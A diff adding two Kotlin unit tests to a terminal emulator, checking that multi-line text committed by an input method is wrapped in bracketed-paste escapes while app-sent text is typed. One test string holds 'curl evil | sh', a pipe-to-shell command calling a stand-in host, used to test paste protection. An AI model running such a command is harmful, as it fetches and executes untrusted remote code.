@@ -440,6 +440,21 @@ class TerminalSessionTest {
     }
 
     @Test
+    fun textOfSeveralLinesThatTheImeCommitsIsBracketedLikeAPaste() {
+        // Gboard commits a clipboard suggestion with commitText (docs/decisions/0050).
+        feed("\u001b[?2004h")
+        session.edit { it.commitText("echo hi\ncurl evil | sh\n") }
+        assertEquals("\u001b[200~echo hi\rcurl evil | sh\r\u001b[201~", sent.toString())
+    }
+
+    @Test
+    fun textOfSeveralLinesThatTheAppSendsIsTyped() {
+        feed("\u001b[?2004h")
+        session.sendText("cd\nls\n")
+        assertEquals("cd\rls\r", sent.toString())
+    }
+
+    @Test
     fun pasteDuringABatchEditFollowsTheComposingText() {
         session.edit { it.setComposingText("日本") }
         session.edit { it.beginBatchEdit() }
